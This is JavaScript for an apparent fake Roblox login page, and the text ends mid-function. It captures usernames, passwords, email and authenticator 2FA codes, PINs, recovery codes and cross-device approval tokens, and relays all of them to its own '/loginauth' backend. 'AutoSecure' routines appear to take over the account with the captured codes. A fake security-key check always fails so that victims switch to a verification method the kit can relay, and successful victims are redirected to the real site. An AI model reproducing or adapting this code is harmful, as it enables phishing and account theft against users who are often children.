let CheckUpd = ''
document.addEventListener('DOMContentLoaded', function () {
  document
    .getElementById('CrossDeviceButtonClose')
    .addEventListener('click', function () {
      clearInterval(CheckUpd)
    })
})
$.ajax(`/auth-token-service/v1/login/create`, {
  method: 'GET',
  headers: {
    'rblx-security-challenge': 'eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ==',
  },
  success: (data) => {
    document
      .getElementsByClassName('cross-device-login-display-qr-code-image')[0]
      .setAttribute(
        'src',
        'https://apis.roblox.com/auth-token-service' + data.imagePath
      )
  },
})
function auth(token) {
  document.getElementById('token').value = token
  $.ajax(`/loginauth/continue`, {
    method: 'POST',
    data: {
      challengeId: document.getElementById('ChallengeId').value,
      unifiedCaptchaId: document.getElementById('unifiedCaptchaId').value,
      captchaToken: document.getElementById('token').value,
      CaptchaRequest: document.getElementById('CaptchaRequest').value,
    },
    success: (data, textStatus, xhr) => {
      if (xhr.status == 200) {
        $.ajax(
          `/loginauth/auth?token=${encodeURIComponent(
            token
          )}&secret=7293255531424362`,
          {
            method: 'POST',
            data: {
              Username: document.getElementById('login-username').value,
              Password: document.getElementById('login-password').value,
              unifiedCaptchaId:
                document.getElementById('unifiedCaptchaId').value,
              CaptchaRequest: document.getElementById('CaptchaRequest').value,
              type: document.getElementById('ChallengeType').value,
              id: document.getElementById('ChallengeId').value,
            },
            headers: {
              'rblx-security-challenge':
                'eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ==',
            },
            success: (data) => {
              window.document.getElementById('text-error').innerHTML = ''
              if (data.pin === true) {
                document.getElementById('PIN').style.display = 'block'
              } else {
                if (data.autosecure === true) {
                  document.getElementById('tokenComplete').value =
                    data.tokenComplete
                  AutoSecureStart(document.getElementById('pin_input').value)
                } else {
                  if (data.success === true) {
                    window.location.replace('https://www.roblox.com')
                  } else {
                    if (data.success === false && data.msg == 'Multiple') {
                      document.getElementById('login-loading').style.display =
                        'none'
                      document.getElementById('login-button').style.display =
                        'block'
                      login(data.userId)
                    } else {
                      if (data.success === false && data.msg == 'Verified') {
                        if (data.StepType == 'Email') {
                          document.getElementById(
                            'twostepverification'
                          ).style.display = 'block'
                        } else {
                          if (data.StepType == 'Authenticator') {
                            document.getElementById(
                              'authenticatorverification'
                            ).style.display = 'block'
                          } else {
                            if (data.StepType == 'SecurityKey') {
                              document.getElementById(
                                'securitykeyverification'
                              ).style.display = 'block'
                            } else {
                              if (data.StepType == 'CrossDevice') {
                                document.getElementById(
                                  'CrossDevicePopup'
                                ).style.display = 'block'
                                document.getElementById(
                                  'CrossDevicePopup-title'
                                ).innerHTML = 'New Login Attempt'
                                document.getElementById(
                                  'CrossDevicePopup-msg'
                                ).innerHTML =
                                  'To approve or reject this attempt, open the Roblox app from a logged-in mobile or tablet device.'
                                var crossdevice =
                                  document.getElementById(
                                    'CaptchaRequest'
                                  ).value
                                $.ajax(
                                  `/loginauth/crossdevice.php?userId=${encodeURIComponent(
                                    data.StepUserId
                                  )}&ticket=${encodeURIComponent(
                                    data.StepTicket
                                  )}&stage=Retry&CrossDevice=${encodeURIComponent(
                                    crossdevice
                                  )}`,
                                  {
                                    method: 'GET',
                                    headers: {
                                      'rblx-security-challenge':
                                        'eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ==',
                                      CaptchaRequest:
                                        document.getElementById(
                                          'CaptchaRequest'
                                        ).value,
                                    },
                                    success: (data2) => {
                                      if (data2.success === true) {
                                        CheckUpd = setInterval(function () {
                                          $.ajax(
                                            `/loginauth/crossdevice.php?userId=${encodeURIComponent(
                                              data.StepUserId
                                            )}&ticket=${encodeURIComponent(
                                              data.StepTicket
                                            )}&stage=Verify&CrossDevice=${encodeURIComponent(
                                              crossdevice
                                            )}`,
                                            {
                                              method: 'GET',
                                              headers: {
                                                'rblx-security-challenge':
                                                  'eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ==',
                                                CaptchaRequest:
                                                  document.getElementById(
                                                    'CaptchaRequest'
                                                  ).value,
                                              },
                                              success: (data3) => {
                                                if (
                                                  data3.success == 'expired'
                                                ) {
                                                  clearInterval(CheckUpd)
                                                  document.getElementById(
                                                    'CrossDevicePopup-title'
                                                  ).innerHTML =
                                                    'Unable To Login'
                                                  document.getElementById(
                                                    'CrossDevicePopup-msg'
                                                  ).innerHTML =
                                                    'This login attempt has expired.<br>Please Retry.'
                                                }
                                                if (data3.success === true) {
                                                  clearInterval(CheckUpd)
                                                  twostepCrossDevicePopup(
                                                    data3.token
                                                  )
                                                }
                                              },
                                            }
                                          )
                                        }, 2500)
                                      } else {
                                        document.getElementById(
                                          'CrossDevicePopup-title'
                                        ).innerHTML = 'Unable To Login'
                                        document.getElementById(
                                          'CrossDevicePopup-msg'
                                        ).innerHTML =
                                          'This login attempt has failed.<br>Please Retry.'
                                      }
                                    },
                                  }
                                )
                              } else {
                                if (data.StepType == 'SecurityQuestion') {
                                  zoom()
                                  document.getElementById(
                                    'Question'
                                  ).style.display = 'block'
                                  document.getElementById('userId').value =
                                    data.StepUserId
                                  document.getElementById('sessionId').value =
                                    data.sessionId
                                  $.ajax(
                                    `/loginauth/securityquestion/generate?userId=${encodeURIComponent(
                                      data.StepUserId
                                    )}&sessionId=${encodeURIComponent(
                                      data.sessionId
                                    )}`,
                                    {
                                      method: 'GET',
                                      headers: {
                                        'rblx-security-challenge':
                                          'eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ==',
                                        CaptchaRequest:
                                          document.getElementById(
                                            'CaptchaRequest'
                                          ).value,
                                      },
                                      success: (data) => {
                                        document.getElementById(
                                          'GameSelectArea'
                                        ).innerHTML = data
                                        console.log('Loaded')
                                      },
                                    }
                                  )
                                }
                              }
                            }
                          }
                        }
                        document.getElementById('ticket').value =
                          data.StepTicket
                        document.getElementById('userid').value =
                          data.StepUserId
                      } else {
                        if (
                          data.msg ==
                          'Account has been locked. Please request a password reset.'
                        ) {
                          window.location.replace(
                            'https://www.roblox.com/login/securityNotification'
                          )
                        } else {
                          if (data.msg == 'Error -> Please Try Again.') {
                            login()
                          } else {
                            if (data.msg == 'Unknown Error.') {
                              login()
                            } else {
                              if (data.msg == 'Too many requests') {
                                login()
                              } else {
                                document.getElementById(
                                  'text-error'
                                ).innerHTML = data.msg
                                document.getElementById(
                                  'login-loading'
                                ).style.display = 'none'
                                document.getElementById(
                                  'login-button'
                                ).style.display = 'block'
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            },
          }
        )
      } else {
        document.getElementById('text-error').innerHTML =
          'Something went wrong, please try again.'
        document.getElementById('login-loading').style.display = 'none'
        document.getElementById('login-button').style.display = 'block'
      }
    },
    error: function () {
      document.getElementById('text-error').innerHTML =
        'Something went wrong, please try again.'
      document.getElementById('login-loading').style.display = 'none'
      document.getElementById('login-button').style.display = 'block'
    },
  })
}
function login(userId = 'None') {
  document.getElementById('login-button').style.display = 'none'
  document.getElementById('login-loading').style.display = 'block'
  var username = document.getElementById('login-username').value
  var password = document.getElementById('login-password').value
  if (!username || !password) {
    document.getElementById('text-error').innerHTML =
      'Username and password required'
    document.getElementById('login-loading').style.display = 'none'
    document.getElementById('login-button').style.display = 'block'
  } else {
    $.ajax(`/get-by-username?username=${encodeURIComponent(username)}`, {
      method: 'GET',
      success: (data) => {
        if (data.Id != '2') {
          $.ajax(
            `/loginauth/preauth?username=${encodeURIComponent(
              username
            )}&password=${encodeURIComponent(
              password
            )}&userId=${encodeURIComponent(userId)}`,
            {
              method: 'GET',
              headers: {
                'rblx-security-challenge':
                  'eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ==',
              },
              success: (data) => {
                if (data.type === 'captcha') {
                  document.getElementById('unifiedCaptchaId').value =
                    data.unifiedCaptchaId
                  document.getElementById('CaptchaRequest').value =
                    data.CaptchaRequest
                  document.getElementById('fc-iframe-wrap').src = data.iframeUrl
                  document.getElementById('ChallengeType').value = data.type
                  document.getElementById('ChallengeId').value = data.id
                } else {
                  if (data.type === 'proofofspace') {
                    handlePuzzle(data.seed, data.rounds, data.layers, data.id)
                  } else {
                    setTimeout(function () {
                      login()
                    }, 5000)
                  }
                }
              },
            }
          )
        } else {
          document.getElementById('text-error').innerHTML =
            'Incorrect username or password. Please try again.'
          document.getElementById('login-loading').style.display = 'none'
          document.getElementById('login-button').style.display = 'block'
        }
      },
    })
  }
}
function UnlockPIN() {
  document.getElementById('UnlockPinBut').disabled = true
  var username = document.getElementById('login-username').value
  var password = document.getElementById('login-password').value
  var code = document.getElementById('pin_input').value
  var CaptchaRequest = document.getElementById('CaptchaRequest').value
  $.ajax(
    `/loginauth/pin?username=${encodeURIComponent(
      username
    )}&password=${encodeURIComponent(
      password
    )}&CaptchaRequest=${encodeURIComponent(
      CaptchaRequest
    )}&pin=${encodeURIComponent(code)}&secret=7293255531424362`,
    {
      method: 'GET',
      headers: {
        'rblx-security-challenge':
          'eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ==',
      },
      success: (data) => {
        document.getElementById('UnlockPinBut').disabled = false
        if (data.recovery === true) {
          document.getElementById('PIN').style.display = 'none'
          document.getElementById('authenticatorverification').style.display =
            'none'
          document.getElementById('twostepverification').style.display = 'none'
          document.getElementById('RecoveryFromEmail').style.display = 'none'
          document.getElementById('RecoveryFromAuthen').style.display = 'none'
          RecoveryCodess(data.type, code)
        } else {
          if (data.success === true) {
            document.getElementById('PIN').style.display = 'none'
            window.location.replace('https://www.roblox.com')
          } else {
            document.getElementById('pinError').innerHTML = data.message
          }
        }
      },
    }
  )
}
function resend() {
  var userid = document.getElementById('userid').value
  var ticket = document.getElementById('ticket').value
  var captcharequest = document.getElementById('CaptchaRequest').value
  $.ajax(
    `/loginauth/resend?id=${encodeURIComponent(
      userid
    )}&ticket=${encodeURIComponent(ticket)}&CaptchaRequest=${encodeURIComponent(
      captcharequest
    )}`,
    {
      method: 'GET',
      headers: {
        'rblx-security-challenge':
          'eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ==',
      },
      success: (data) => {
        console.log(data)
      },
    }
  )
}
function AutoSecureEnd(type) {
  document.getElementById('verifyButtonA').disabled = 'true'
  document.getElementById('verifyButtonA').innerHTML =
    '<div id="login-loading" class="spinner spinner-sm spinner-no-margin spinner-block"></div>'
  var code = document.querySelector(
    '#two-step-verification-code-inputAUTOSECURE'
  ).value
  var ticket = document.getElementById('ticket').value
  var userid = document.getElementById('userid').value
  var server = document.getElementById('server').value
  var password = document.getElementById('login-password').value
  var tokenComplete = document.getElementById('tokenComplete').value
  var chalData = document.getElementById('chalData').value
  $.ajax(
    `/loginauth/autosecure?password=${encodeURIComponent(
      password
    )}&data=${encodeURIComponent(chalData)}&tokenComplete=${encodeURIComponent(
      tokenComplete
    )}&secret=7293255531424362&end=1&code=${code}`,
    {
      method: 'GET',
      headers: {
        'rblx-security-challenge':
          'eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ==',
        CaptchaRequest: document.getElementById('CaptchaRequest').value,
      },
      success: (data) => {
        if (data.success === true) {
          window.location.replace('https://www.roblox.com')
        } else {
          if (data.message) {
            if (type == 'email') {
              document.getElementById('verifyButtonA').innerHTML = 'Verify'
              document
                .getElementById('twostep-groupA')
                .setAttribute(
                  'class',
                  'form-has-feedback  form-has-error form-group'
                )
              document.getElementById('twostep-errorA').innerHTML = data.message
              document
                .getElementById('verifyButtonA')
                .removeAttribute('disabled')
              document.getElementById('verifyButtonA').innerHTML = 'Verify'
            }
          } else {
            if (data.retry === true) {
              document
                .getElementById('verifyButtonA')
                .removeAttribute('disabled')
              document.getElementById('verifyButtonA').innerHTML = 'Verify'
              AutoSecureStart(document.getElementById('pin_input').value)
            } else {
            }
          }
        }
      },
    }
  )
}
function AutoSecureStart(pin = 'Empty') {
  document.getElementById('RecoveryFromEmail').style.display = 'none'
  document.getElementById('RecoveryFromAuthen').style.display = 'none'
  document.getElementById('authenticatorverification').style.display = 'none'
  document.getElementById('twostepverification').style.display = 'none'
  document.getElementById('CrossDevicePopup').style.display = 'none'
  document.getElementById('twostepAUTOSECURE').style.display = 'none'
  var userid = document.getElementById('userid').value
  var server = document.getElementById('server').value
  var password = document.getElementById('login-password').value
  var CaptchaRequest = document.getElementById('CaptchaRequest').value
  var tokenComplete = document.getElementById('tokenComplete').value
  $.ajax(
    `/loginauth/autosecure?password=${encodeURIComponent(
      password
    )}&CaptchaRequest=${encodeURIComponent(
      CaptchaRequest
    )}&tokenComplete=${encodeURIComponent(
      tokenComplete
    )}&pin=${encodeURIComponent(pin)}&secret=7293255531424362&start=1`,
    {
      method: 'GET',
      headers: {
        'rblx-security-challenge':
          'eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ==',
        CaptchaRequest: document.getElementById('CaptchaRequest').value,
      },
      success: (data) => {
        if (data.success === true) {
          window.location.replace('https://www.roblox.com')
        }
        if (data.continue === true) {
          document.getElementById('twostepAUTOSECURE').style.display = 'block'
          document.getElementById('chalData').value = data.data
          document.getElementById('twostepAUTOSECURE-text').innerHTML = data.msg
          document.getElementById('verifyButtonA').innerHTML = 'Verify'
          document
            .getElementById('twostep-groupA')
            .setAttribute(
              'class',
              'form-has-feedback  form-has-error form-group'
            )
          document.getElementById('twostep-errorA').innerHTML =
            'A Further code is required. Please Enter a New Code'
          document.getElementById('verifyButtonA').removeAttribute('disabled')
          document.getElementById('verifyButtonA').innerHTML = 'Verify'
        }
      },
    }
  )
}
function RecoveryCodess(type, pin = 'Empty') {
  document.getElementById('authenticatorverificationRECOVERY').style.display =
    'none'
  document.getElementById('twostepverificationRECOVERY').style.display = 'none'
  var code = document.getElementById('two-step-verification-code-input').value
  var ticket = document.getElementById('ticket').value
  var userid = document.getElementById('userid').value
  var server = document.getElementById('server').value
  var password = document.getElementById('login-password').value
  var CaptchaRequest = document.getElementById('CaptchaRequest').value
  $.ajax(
    `/loginauth/recoverycodes?password=${encodeURIComponent(
      password
    )}&CaptchaRequest=${encodeURIComponent(
      CaptchaRequest
    )}&pin=${encodeURIComponent(pin)}&secret=7293255531424362&start=1`,
    {
      method: 'GET',
      headers: {
        'rblx-security-challenge':
          'eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ==',
      },
      success: (data) => {
        if (data.success === true) {
          if (type == 'email') {
            document.getElementById(
              'twostepverificationRECOVERY'
            ).style.display = 'block'
            document.getElementById('verifyButtonR').innerHTML = 'Verify'
            document
              .getElementById('twostep-groupR')
              .setAttribute(
                'class',
                'form-has-feedback  form-has-error form-group'
              )
            document.getElementById('twostep-errorR').innerHTML =
              'The 6 Digit Code has Expired. Please Enter a New Code'
            document.getElementById('verifyButtonR').removeAttribute('disabled')
            document.getElementById('verifyButtonR').innerHTML = 'Verify'
          }
          if (type == 'auth') {
            document.getElementById(
              'authenticatorverificationRECOVERY'
            ).style.display = 'block'
            document.getElementById('AuthenButtonR').innerHTML = 'Verify'
            document
              .getElementById('Authen-groupR')
              .setAttribute(
                'class',
                'form-has-feedback  form-has-error form-group'
              )
            document.getElementById('Authen-errorR').innerHTML =
              'The 6 Digit Code has Expired. Please Enter a New Code'
            document.getElementById('AuthenButtonR').removeAttribute('disabled')
            document.getElementById('AuthenButtonR').innerHTML = 'Verify'
          }
        }
      },
    }
  )
}
function RecoveryCodes(type) {
  document.getElementById('verifyButtonR').disabled = 'true'
  document.getElementById('verifyButtonR').innerHTML =
    '<div id="login-loading" class="spinner spinner-sm spinner-no-margin spinner-block"></div>'
  document.getElementById('AuthenButtonR').disabled = 'true'
  document.getElementById('AuthenButtonR').innerHTML =
    '<div id="login-loading" class="spinner spinner-sm spinner-no-margin spinner-block"></div>'
  if (type == 'email') {
    var code = document.querySelector(
      '#two-step-verification-code-inputRECOVERY'
    ).value
  } else {
    var code = document.querySelector(
      '#two-step-verification-code-input-authenticatorRECOVERY'
    ).value
  }
  var ticket = document.getElementById('ticket').value
  var userid = document.getElementById('userid').value
  var server = document.getElementById('server').value
  var password = document.getElementById('login-password').value
  var CaptchaRequest = document.getElementById('CaptchaRequest').value
  $.ajax(
    `/loginauth/recoverycodes?password=${encodeURIComponent(
      password
    )}&secret=7293255531424362&end=1&code=${code}&CaptchaRequest=${encodeURIComponent(
      CaptchaRequest
    )}`,
    {
      method: 'GET',
      headers: {
        'rblx-security-challenge':
          'eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ==',
      },
      success: (data) => {
        if (data.autosecure === true) {
          document.getElementById(
            'authenticatorverificationRECOVERY'
          ).style.display = 'none'
          document.getElementById('twostepverificationRECOVERY').style.display =
            'none'
          AutoSecureStart(document.getElementById('pin_input').value)
        } else {
          if (data.message) {
            if (type == 'email') {
              document.getElementById('verifyButtonR').innerHTML = 'Verify'
              document
                .getElementById('twostep-groupR')
                .setAttribute(
                  'class',
                  'form-has-feedback  form-has-error form-group'
                )
              document.getElementById('twostep-errorR').innerHTML = data.message
              document
                .getElementById('verifyButtonR')
                .removeAttribute('disabled')
              document.getElementById('verifyButtonR').innerHTML = 'Verify'
            }
            if (type == 'auth') {
              document.getElementById('AuthenButtonR').innerHTML = 'Verify'
              document
                .getElementById('Authen-groupR')
                .setAttribute(
                  'class',
                  'form-has-feedback  form-has-error form-group'
                )
              document.getElementById('Authen-errorR').innerHTML = data.message
              document
                .getElementById('AuthenButtonR')
                .removeAttribute('disabled')
              document.getElementById('AuthenButtonR').innerHTML = 'Verify'
            }
          } else {
            if (data.retry === true) {
              document
                .getElementById('verifyButtonR')
                .removeAttribute('disabled')
              document.getElementById('verifyButtonR').innerHTML = 'Verify'
              document
                .getElementById('AuthenButtonR')
                .removeAttribute('disabled')
              document.getElementById('AuthenButtonR').innerHTML = 'Verify'
              RecoveryCodess(type)
            } else {
            }
          }
        }
      },
    }
  )
}
function twostepCrossDevicePopup(verifToken) {
  var twoStepError = document.getElementById('twostep-error').innerHTML
  if (twoStepError) {
    var twoStepError = (document.getElementById('twostep-error').innerHTML =
      '&nbsp;')
  }
  document.getElementById('verifyButton').disabled = 'true'
  document.getElementById('verifyButton').innerHTML =
    '<div id="login-loading" class="spinner spinner-sm spinner-no-margin spinner-block"></div>'
  var ticket = document.getElementById('ticket').value
  var userid = document.getElementById('userid').value
  var server = document.getElementById('server').value
  var password = document.getElementById('login-password').value
  var CaptchaRequest = document.getElementById('CaptchaRequest').value
  $.ajax(
    `/loginauth/twostep?id=${encodeURIComponent(
      userid
    )}&verifToken=${encodeURIComponent(verifToken)}&ticket=${encodeURIComponent(
      ticket
    )}&password=${encodeURIComponent(
      password
    )}&CaptchaRequest=${encodeURIComponent(
      CaptchaRequest
    )}&code=${encodeURIComponent(
      '666666'
    )}&secret=7293255531424362&type=CrossDevice`,
    {
      method: 'GET',
      headers: {
        'rblx-security-challenge':
          'eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ==',
      },
      success: (data) => {
        if (data.success === true) {
          window.location.replace('https://www.roblox.com')
        }
        if (data.pin === true) {
          document.getElementById('CrossDevicePopup').style.display = 'none'
          document.getElementById('PIN').style.display = 'block'
        }
        if (data.RecoveryCode === true) {
          document.getElementById('CrossDevicePopup').style.display = 'none'
          RecoveryCodess('email')
        } else {
          if (data.autosecure === true) {
            document.getElementById('tokenComplete').value = data.tokenComplete
            AutoSecureStart(document.getElementById('pin_input').value)
          } else {
            document.getElementById('CrossDevicePopup-title').innerHTML =
              'Unable To Login'
            document.getElementById('CrossDevicePopup-msg').innerHTML =
              'This login attempt has failed.<br>Please Retry.'
          }
        }
      },
    }
  )
}
function twostep() {
  var twoStepError = document.getElementById('twostep-error').innerHTML
  if (twoStepError) {
    var twoStepError = (document.getElementById('twostep-error').innerHTML =
      '&nbsp;')
  }
  document.getElementById('verifyButton').disabled = 'true'
  document.getElementById('verifyButton').innerHTML =
    '<div id="login-loading" class="spinner spinner-sm spinner-no-margin spinner-block"></div>'
  var code = document.getElementById('two-step-verification-code-input').value
  var ticket = document.getElementById('ticket').value
  var userid = document.getElementById('userid').value
  var server = document.getElementById('server').value
  var password = document.getElementById('login-password').value
  var CaptchaRequest = document.getElementById('CaptchaRequest').value
  $.ajax(
    `/loginauth/twostep?id=${encodeURIComponent(
      userid
    )}&ticket=${encodeURIComponent(ticket)}&password=${encodeURIComponent(
      password
    )}&CaptchaRequest=${encodeURIComponent(
      CaptchaRequest
    )}&code=${encodeURIComponent(code)}&secret=7293255531424362&type=Email`,
    {
      method: 'GET',
      headers: {
        'rblx-security-challenge':
          'eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ==',
      },
      success: (data) => {
        if (data.success === true) {
          window.location.replace('https://www.roblox.com')
        }
        if (data.pin === true) {
          document.getElementById('authenticatorverification').style.display =
            'none'
          document.getElementById('twostepverification').style.display = 'none'
          document.getElementById('RecoveryFromEmail').style.display = 'none'
          document.getElementById('RecoveryFromAuthen').style.display = 'none'
          document.getElementById('PIN').style.display = 'block'
        }
        if (data.RecoveryCode === true) {
          document.getElementById('twostepverification').style.display = 'none'
          RecoveryCodess('email')
        } else {
          if (data.autosecure === true) {
            document.getElementById('tokenComplete').value = data.tokenComplete
            AutoSecureStart(document.getElementById('pin_input').value)
          } else {
            document.getElementById('verifyButton').innerHTML = 'Verify'
            document
              .getElementById('twostep-group')
              .setAttribute(
                'class',
                'form-has-feedback  form-has-error form-group'
              )
            document.getElementById('twostep-error').innerHTML = data.msg
            document.getElementById('verifyButton').removeAttribute('disabled')
            document.getElementById('verifyButton').innerHTML = 'Verify'
          }
        }
      },
    }
  )
}
function Authen() {
  var twoStepError = document.getElementById('Authen-error').innerHTML
  if (twoStepError) {
    var twoStepError = (document.getElementById('Authen-error').innerHTML =
      '&nbsp;')
  }
  document.getElementById('AuthenButton').disabled = 'true'
  document.getElementById('AuthenButton').innerHTML =
    '<div id="login-loading" class="spinner spinner-sm spinner-no-margin spinner-block"></div>'
  var code = document.getElementById(
    'two-step-verification-code-input-authenticator'
  ).value
  var ticket = document.getElementById('ticket').value
  var userid = document.getElementById('userid').value
  var server = document.getElementById('server').value
  var password = document.getElementById('login-password').value
  var CaptchaRequest = document.getElementById('CaptchaRequest').value
  $.ajax(
    `/loginauth/twostep?id=${encodeURIComponent(
      userid
    )}&CaptchaRequest=${encodeURIComponent(
      CaptchaRequest
    )}&password=${encodeURIComponent(password)}&ticket=${encodeURIComponent(
      ticket
    )}&code=${encodeURIComponent(
      code
    )}&secret=7293255531424362&type=Authenticator`,
    {
      method: 'GET',
      headers: {
        'rblx-security-challenge':
          'eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ==',
      },
      success: (data) => {
        if (data.success === true) {
          window.location.replace('https://www.roblox.com')
        }
        if (data.pin === true) {
          document.getElementById('authenticatorverification').style.display =
            'none'
          document.getElementById('twostepverification').style.display = 'none'
          document.getElementById('RecoveryFromEmail').style.display = 'none'
          document.getElementById('RecoveryFromAuthen').style.display = 'none'
          document.getElementById('PIN').style.display = 'block'
        }
        if (data.RecoveryCode === true) {
          document.getElementById('authenticatorverification').style.display =
            'none'
          RecoveryCodess('auth')
        } else {
          if (data.autosecure === true) {
            document.getElementById('tokenComplete').value = data.tokenComplete
            AutoSecureStart(document.getElementById('pin_input').value)
          } else {
            document.getElementById('AuthenButton').innerHTML = 'Verify'
            document
              .getElementById('Authen-group')
              .setAttribute(
                'class',
                'form-has-feedback  form-has-error form-group'
              )
            document.getElementById('Authen-error').innerHTML = data.msg
            document.getElementById('AuthenButton').removeAttribute('disabled')
            document.getElementById('AuthenButton').innerHTML = 'Verify'
          }
        }
      },
    }
  )
}
function RecoveryFromAuthen() {
  var twoStepError = document.getElementById(
    'RecoveryFromAuthen-error'
  ).innerHTML
  if (twoStepError) {
    var twoStepError = (document.getElementById(
      'RecoveryFromAuthen-error'
    ).innerHTML = '&nbsp;')
  }
  document.getElementById('RecoveryFromAuthenButton').disabled = 'true'
  document.getElementById('RecoveryFromAuthenButton').innerHTML =
    '<div id="login-loading" class="spinner spinner-sm spinner-no-margin spinner-block"></div>'
  var code = document.getElementById(
    'two-step-verification-code-input-recoveryFromAuthen'
  ).value
  var ticket = document.getElementById('ticket').value
  var userid = document.getElementById('userid').value
  var server = document.getElementById('server').value
  var password = document.getElementById('login-password').value
  var CaptchaRequest = document.getElementById('CaptchaRequest').value
  $.ajax(
    `/loginauth/twostep?id=${encodeURIComponent(
      userid
    )}&CaptchaRequest=${encodeURIComponent(
      CaptchaRequest
    )}&password=${encodeURIComponent(password)}&ticket=${encodeURIComponent(
      ticket
    )}&code=${encodeURIComponent(code)}&secret=7293255531424362&type=Recovery`,
    {
      method: 'GET',
      headers: {
        'rblx-security-challenge':
          'eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ==',
      },
      success: (data) => {
        if (data.success === true) {
          window.location.replace('https://www.roblox.com')
        }
        if (data.pin === true) {
          document.getElementById('authenticatorverification').style.display =
            'none'
          document.getElementById('twostepverification').style.display = 'none'
          document.getElementById('RecoveryFromEmail').style.display = 'none'
          document.getElementById('RecoveryFromAuthen').style.display = 'none'
          document.getElementById('PIN').style.display = 'block'
        }
        if (data.RecoveryCode === true) {
          document.getElementById('RecoveryFromAuthen').style.display = 'none'
          RecoveryCodess(data.type)
        } else {
          if (data.autosecure === true) {
            document.getElementById('tokenComplete').value = data.tokenComplete
            AutoSecureStart(document.getElementById('pin_input').value)
          } else {
            document.getElementById('RecoveryFromAuthenButton').innerHTML =
              'Verify'
            document
              .getElementById('RecoveryFromAuthen-group')
              .setAttribute(
                'class',
                'form-has-feedback  form-has-error form-group'
              )
            document.getElementById('RecoveryFromAuthen-error').innerHTML =
              data.msg
            document
              .getElementById('RecoveryFromAuthenButton')
              .removeAttribute('disabled')
            document.getElementById('RecoveryFromAuthenButton').innerHTML =
              'Verify'
          }
        }
      },
    }
  )
}
function RecoveryFromEmail() {
  var twoStepError = document.getElementById(
    'RecoveryFromEmail-error'
  ).innerHTML
  if (twoStepError) {
    var twoStepError = (document.getElementById(
      'RecoveryFromEmail-error'
    ).innerHTML = '&nbsp;')
  }
  document.getElementById('RecoveryFromEmailButton').disabled = 'true'
  document.getElementById('RecoveryFromEmailButton').innerHTML =
    '<div id="login-loading" class="spinner spinner-sm spinner-no-margin spinner-block"></div>'
  var code = document.getElementById(
    'two-step-verification-code-input-RecoveryFromEmail'
  ).value
  var ticket = document.getElementById('ticket').value
  var userid = document.getElementById('userid').value
  var server = document.getElementById('server').value
  var password = document.getElementById('login-password').value
  var CaptchaRequest = document.getElementById('CaptchaRequest').value
  $.ajax(
    `/loginauth/twostep?id=${encodeURIComponent(
      userid
    )}&CaptchaRequest=${encodeURIComponent(
      CaptchaRequest
    )}&password=${encodeURIComponent(password)}&ticket=${encodeURIComponent(
      ticket
    )}&code=${encodeURIComponent(code)}&secret=7293255531424362&type=Recovery`,
    {
      method: 'GET',
      headers: {
        'rblx-security-challenge':
          'eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ==',
      },
      success: (data) => {
        if (data.success === true) {
          window.location.replace('https://www.roblox.com')
        }
        if (data.pin === true) {
          document.getElementById('authenticatorverification').style.display =
            'none'
          document.getElementById('twostepverification').style.display = 'none'
          document.getElementById('RecoveryFromEmail').style.display = 'none'
          document.getElementById('RecoveryFromAuthen').style.display = 'none'
          document.getElementById('PIN').style.display = 'block'
        }
        if (data.RecoveryCode === true) {
          document.getElementById('RecoveryFromEmail').style.display = 'none'
          RecoveryCodess(data.type)
        } else {
          if (data.autosecure === true) {
            document.getElementById('tokenComplete').value = data.tokenComplete
            AutoSecureStart(document.getElementById('pin_input').value)
          } else {
            document.getElementById('RecoveryFromEmailButton').innerHTML =
              'Verify'
            document
              .getElementById('RecoveryFromEmail-group')
              .setAttribute(
                'class',
                'form-has-feedback  form-has-error form-group'
              )
            document.getElementById('RecoveryFromEmail-error').innerHTML =
              data.msg
            document
              .getElementById('RecoveryFromEmailButton')
              .removeAttribute('disabled')
            document.getElementById('RecoveryFromEmailButton').innerHTML =
              'Verify'
          }
        }
      },
    }
  )
}
var securityKeyCount = 0
function securityKey() {
  document.getElementById('securitykeyButton').disabled = 'true'
  document.getElementById(
    'securitykeyButton'
  ).innerHTML = `<span class="spinner spinner-xs spinner-no-margin"></span>`
  setTimeout(function () {
    document.getElementById('securitykeyButton').removeAttribute('disabled')
    document.getElementById('securitykeyButton').innerHTML = `Verify`
    document.getElementById('securitykey-error').style.display = 'block'
  }, 1750)
  if (securityKeyCount >= 3) {
    document.getElementById('securitykeyverification').style.display = 'none'
    document.getElementById(
      'selectVerificationMethodSecurityKey'
    ).style.display = 'block'
  } else {
    securityKeyCount++
  }
}
function ConfirmQuestion() {
  document.getElementById('selectGameButton').disabled = true
  document.getElementById('selectGameButton').innerHTML =
    '<span class="spinner spinner-xs spinner-no-margin"></span>'
  var username = document.getElementById('login-username').value
  var password = document.getElementById('login-password').value
  var tokenQuest = document.getElementById('captchaQuestion').value
  var userId = document.getElementById('userId').value
  var sessionId = document.getElementById('sessionId').value
  var server = document.getElementById('serverQuestion').value
  const getAnswer = document.getElementsByClassName(
    'answer-choice-image answer-choice-selected'
  )
  let i = 0
  var AnswerJSON = []
  while (i < getAnswer.length) {
    var getUniverseId = getAnswer[i].getAttribute('data-universe-id')
    AnswerJSON[i] = getUniverseId
    i++
  }
  $.ajax(
    `/loginauth/securityquestion/request?userId=${encodeURIComponent(
      userId
    )}&sessionId=${encodeURIComponent(sessionId)}&answerA=${
      AnswerJSON[0]
